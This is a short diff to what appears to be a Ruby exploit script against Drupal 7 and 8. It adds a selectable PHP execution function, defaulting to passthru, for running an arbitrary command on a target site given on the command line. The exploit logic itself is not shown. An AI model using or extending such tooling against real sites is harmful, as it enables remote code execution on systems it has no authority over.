@@ -121,11 +121,12 @@ end
 target = ARGV[0]
 version = ARGV[1]
 command = ARGV[2]
+php_method = ARGV[3] || 'passthru'
 
 if version == "7"
-	drupal = Drupal7.new(target,command)
+	drupal = Drupal7.new(target,command,php_method)
 else
-	drupal = Drupal8.new(target,command)
+	drupal = Drupal8.new(target,command,php_method)
 end
 
 drupal.exploit
